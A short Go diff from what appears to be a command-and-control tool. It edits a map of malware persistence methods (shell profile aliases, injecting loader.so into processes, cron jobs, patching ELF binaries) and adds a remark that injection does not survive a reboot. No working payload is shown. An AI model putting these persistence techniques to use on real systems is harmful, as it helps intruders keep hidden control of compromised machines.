@@ -95,7 +95,7 @@ const (
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
 var PersistMethods = map[string]string{
 	"profiles": "Add some aliases to shell profiles",
-	"injector": "Inject loader.so to some processes",
+	"injector": "Inject loader.so to some processes, will lose persistence after reboot",
 	"cron":     "Add a cronjob",
 	"patcher":  "Patch some ELFs",
 }
